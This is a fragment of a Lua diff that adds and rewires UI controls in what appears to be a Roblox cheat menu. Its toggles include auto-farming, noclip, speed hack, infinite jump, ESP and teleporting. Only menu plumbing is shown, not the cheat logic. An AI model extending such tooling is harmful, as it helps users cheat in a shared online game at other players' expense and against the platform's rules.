+		PlayerDropdownList,
+		BoulderDropdownList,
+		UI.RuneDropdownList,
+		UI.DigBoulderDropdownList,
+		UI.BoulderLevelDropdownList,
+		BombDropdownList,
+		UI.RadarDropdownList
+	}) do
+		connect(otherList:GetPropertyChangedSignal("Visible"), function()
+			if otherList.Visible then
+				UI.RunePlaceDropdownList.Visible = false
+			end
 		end)
 	end
+
+	for _, control in ipairs(Content:GetDescendants()) do
+		if control:IsA("TextButton")
+			and control ~= UI.RunePlaceDropdownButton
+			and control ~= UI.AutoPlaceRuneButton
+			and not control:IsDescendantOf(UI.RunePlaceDropdownList) then
+			connect(control.Activated, function()
+				UI.RunePlaceDropdownList.Visible = false
+			end)
+		end
+	end
 end
+
+State.ConnectRunePlaceDropdownClosers()
 
 connect(UI.DigReplayButton.Activated, function()
 	FilterTypeList.Visible = false
@@ -8768,6 +9656,19 @@ connect(UI.BoulderLevelFarmButton.Activated, function()
 	UI.BoulderLevelDropdownList.Visible = false
 	BombDropdownList.Visible = false
 	State.SetBoulderLevelFarmEnabled(not State.BoulderLevelFarmEnabled)
+end)
+
+connect(UI.BoulderLevelFarmBombButton.Activated, function()
+	FilterTypeList.Visible = false
+	WeightModeList.Visible = false
+	PlayerDropdownList.Visible = false
+	BoulderDropdownList.Visible = false
+	UI.RuneDropdownList.Visible = false
+	UI.RunePlaceDropdownList.Visible = false
+	UI.DigBoulderDropdownList.Visible = false
+	UI.BoulderLevelDropdownList.Visible = false
+	BombDropdownList.Visible = false
+	State.SetBoulderLevelFarmBombEnabled(not State.BoulderLevelFarmBombEnabled)
 end)
 
 connect(PlayerDropdownButton.Activated, function()
@@ -9014,22 +9915,37 @@ connect(UI.BuyRadarButton.Activated, function()
 end)
 
 connect(CloseButton.Activated, function()
-	setFarming(false)
-	setBuyingBomb(false)
-	State.SetBuyingRadar(false)
-	State.SetDigReplayEnabled(false)
-	State.SetAutoPlaceRuneEnabled(false)
-	setPlayerTeleporting(false)
-	setBoulderTeleporting(false)
-	State.SetNoclipEnabled(false)
-	State.SetFloatEnabled(false)
-	State.SetSpeedHackEnabled(false)
-	State.SetInfiniteJumpEnabled(false)
-	setBoulderEspEnabled(false)
-	setBoulderPromptEnabled(false)
-	State.SetBoulderLevelFarmEnabled(false)
-	State.SetBoulderHopEnabled(false)
-	State.SetBoulderRejoinEnabled(false)
+	State.UpdateFarmDistance(nil, false)
+	updateWeightThreshold(nil, false)
+	updateMoneyThreshold(nil, false)
+	updateLuckThreshold(nil, false)
+	State.MoneyDropThresholdText = tostring(UI.MoneyDropInput and UI.MoneyDropInput.Text or ""):match("^%s*(.-)%s*$") or ""
+	UI.MoneyDropInput.Text = State.MoneyDropThresholdText
+	local runeDropAmount = math.floor(tonumber(UI.RuneAmountInput and UI.RuneAmountInput.Text) or State.RuneDropAmount or 1)
+	State.RuneDropAmount = math.max(1, runeDropAmount)
+	UI.RuneAmountInput.Text = tostring(State.RuneDropAmount)
+	local runePlaceAmount = math.floor(tonumber(UI.RunePlaceAmountInput and UI.RunePlaceAmountInput.Text) or State.RunePlaceAmount or 1)
+	State.RunePlaceAmount = math.max(1, runePlaceAmount)
+	UI.RunePlaceAmountInput.Text = tostring(State.RunePlaceAmount)
+	State.SaveConfig()
+	setFarming(false, false)
+	setBuyingBomb(false, false)
+	State.SetBuyingRadar(false, false)
+	State.SetDigReplayEnabled(false, false)
+	State.SetAutoPlaceRuneEnabled(false, false)
+	State.RunePlaceManualRunning = false
+	State.RunePlace.UpdateManualButton()
+	setPlayerTeleporting(false, false)
+	setBoulderTeleporting(false, false)
+	State.SetNoclipEnabled(false, false)
+	State.SetFloatEnabled(false, false)
+	State.SetSpeedHackEnabled(false, false)
+	State.SetInfiniteJumpEnabled(false, false)
+	setBoulderEspEnabled(false, false)
+	setBoulderPromptEnabled(false, false)
+	State.SetBoulderLevelFarmEnabled(false, false)
+	State.SetBoulderHopEnabled(false, false)
+	State.SetBoulderRejoinEnabled(false, false)
 	FilterTypeList.Visible = false
 	WeightModeList.Visible = false
 	PlayerDropdownList.Visible = false
@@ -9094,6 +10010,8 @@ function State.Stop()
 	State.SetBuyingRadar(false)
 	State.SetDigReplayEnabled(false)
 	State.SetAutoPlaceRuneEnabled(false)
+	State.RunePlaceManualRunning = false
+	State.RunePlace.UpdateManualButton()
 	setPlayerTeleporting(false)
 	setBoulderTeleporting(false)
 	State.SetNoclipEnabled(false)
@@ -9413,6 +10331,10 @@ function State.SetBoulderLevelFarm(levelOrEnabled, enabled)
 	end
 
 	return State.SetBoulderLevelFarmEnabled(levelOrEnabled)
+end
+
+function State.SetBoulderLevelFarmBomb(enabled)
+	return State.SetBoulderLevelFarmBombEnabled(enabled)
 end
 
 function State.StartBoulderLevelFarm(level)
@@ -9749,11 +10671,14 @@ updateBoulderEspButton()
 updateBoulderPromptButton()
 State.UpdateBoulderLevelDropdownText()
 State.UpdateBoulderLevelFarmButton()
+State.UpdateBoulderLevelFarmBombButton()
 State.UpdateBoulderHopButton()
 State.UpdateBoulderRejoinButton()
 RuneDrop.UpdateDropdownText()
 State.RunePlace.UpdateDropdownText()
+State.RunePlace.UpdateAmount(nil, false)
 State.RunePlace.UpdateToggleButton()
+State.RunePlace.UpdateManualButton()
 State.UpdateGearShopBuyAllButton()
 State.UpdateBuyBombButtonText()
 updateBombDropdownText()
